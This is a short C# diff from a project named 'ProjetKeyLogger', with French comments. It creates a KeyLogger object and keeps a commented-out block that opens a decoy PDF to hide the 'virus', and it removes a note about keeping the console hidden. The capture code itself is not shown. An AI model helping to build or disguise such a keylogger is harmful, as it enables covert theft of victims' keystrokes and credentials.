@@ -10,8 +10,6 @@ namespace ProjetKeyLogger
         /// </summary>
         static void Main()
         {
-            //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
-           
             /*
             //Génere un document PDF pour dissimuler le virus
             var pdf = new Process();
@@ -20,6 +18,7 @@ namespace ProjetKeyLogger
             {UseShellExecute = true};
             //Ouverture du pdf
             pdf.Start();*/
+            Console.WriteLine("hello");
 
             //création de l'objet KeyLogger
             KeyLogger key_logger = new KeyLogger();
